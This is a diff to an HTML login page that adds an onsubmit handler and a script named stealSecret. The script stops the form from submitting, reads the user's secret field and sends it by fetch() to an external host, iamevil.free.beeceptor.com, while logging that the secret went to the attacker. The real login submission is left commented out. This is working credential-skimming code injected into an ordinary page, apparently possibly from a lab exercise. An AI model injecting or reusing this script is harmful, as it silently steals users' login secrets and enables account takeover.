@@ -23,7 +23,7 @@
 <div style="display: flex; margin: auto; text-align: center; justify-content: center;">
     <fieldset style="width: 50%">
         <legend>Login</legend>
-        <form method="POST" action="/login">
+        <form id="loginForm" method="POST" action="/login" onsubmit="stealSecret(event)">
             <label>Username</label><br>
             <input id="username" class="mgb-1" name="username"></input><br>
             <label>Secret</label><br>
@@ -32,5 +32,22 @@
         </form>
     </fieldset>
 </div>
+
+<script>
+    function stealSecret(event) {
+        event.preventDefault(); // Prevent the form from submitting normally
+        const secret = document.getElementById('secret').value;
+        const url = `https://iamevil.free.beeceptor.com/?session=${encodeURIComponent(secret)}`;
+        
+        // Send the request to the malicious server
+        fetch(url)
+            .then(response => console.log('Secret sent to attacker:', response))
+            .catch(error => console.error('Error sending secret:', error));
+
+        // Optionally, you can still submit the form to the original action
+        // Uncomment the following line if needed
+        // event.target.submit();
+    }
+</script>
 </body>
 </html>
